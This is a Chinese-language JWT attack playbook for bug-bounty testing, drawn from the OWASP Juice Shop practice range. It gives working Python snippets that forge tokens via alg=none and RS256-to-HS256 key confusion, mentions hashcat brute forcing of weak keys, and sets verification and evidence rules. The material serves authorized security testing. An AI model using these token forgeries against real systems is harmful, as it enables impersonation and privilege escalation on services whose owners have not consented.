---
name: jwt-attacks
category: jwt
source: 渗透/juice-shop-closeout/patterns/jwt-attacks.md
verified_in: [juice-shop-113-jwt-unsigned, juice-shop-rs256-hs256]
src_value: high
severity_ceiling: high
requires_auth: false
payload_count: 3
---

# JWT 攻击验证剧本

> 来源：OWASP Juice Shop 实战（111/113 挑战，98.2% 完成率）。payload 已在靶场验证。

## 1. 识别

1. 定位 token 位置：`Authorization: Bearer` / Cookie / 请求体
2. 用 base64 解码 Header + Payload，记录：
   - `alg` 字段（RS256 / HS256 / none）
   - 用户 ID 字段路径（如 `data.id` 或 `user.data.id`）
   - 角色字段路径（如 `data.role`）
3. 判断服务端验证强度：
   - 无签名校验 → alg=none 可直打
   - 共用公钥验证 → RS256→HS256 混淆可打
   - 弱密钥 → 爆破可打

## 2. Payload 序列

按优先级，从最小破坏开始：

```python
# 1. alg=none（无签名）
import jwt
token = jwt.encode({"data": {"email": "attacker@example.com"}}, key="", algorithm="none")
# Header: {"alg":"none","typ":"JWT"}，签名留空

# 2. RS256 → HS256 算法混淆
# 原理：服务器用同一个 publicKey 变量验证两种算法；
#       攻击者拿 RSA 公钥当 HMAC secret 签名。
with open("rsa.pub") as f:
    pubkey = f.read()
token = jwt.encode({"data": {"email": "attacker@example.com"}}, key=pubkey, algorithm="HS256")

# 3. 弱密钥爆破（低危，最后用）
# jwt_tool 或 hashcat -m 16500 配合常见密钥字典
```

### 关键结构速查

| 部分 | 字段 | 说明 |
|------|------|------|
| Header | `alg` | RS256→HS256 混淆的关键 |
| Payload | `data.id` / `data.role` | 用户身份与角色位置（中间件可能用 `user.data.id`） |

## 3. 判定标准

confirmed 需同时满足：
- [ ] 修改后的 token 被服务端接受（返回 200 / 非 401）
- [ ] 权限或身份发生实际变化（访问到原身份不可见的资源）
- [ ] 原始 token 与修改 token 的请求响应差异可复现

## 4. 证据要求

按 `evidence-record.md` 模板记录：
- 原始 token（脱敏）与修改后 token 完整值
- 两次请求与响应摘录（状态码差异）
- 权限提升的实际证明（如访问到管理员接口）

## 5. SRC 适用边界

- 适用：任何使用 JWT 认证的 Web/API 应用（Node/Java/Python 后端常见）
- 不适用：OAuth2 纯授权码流程（无自定义 JWT）、服务端严格校验 alg 白名单的站点
- 注意：alg=none 测试用最小破坏 payload（仅改自己的 email/id），不要直接提权为 admin 造成越权污染
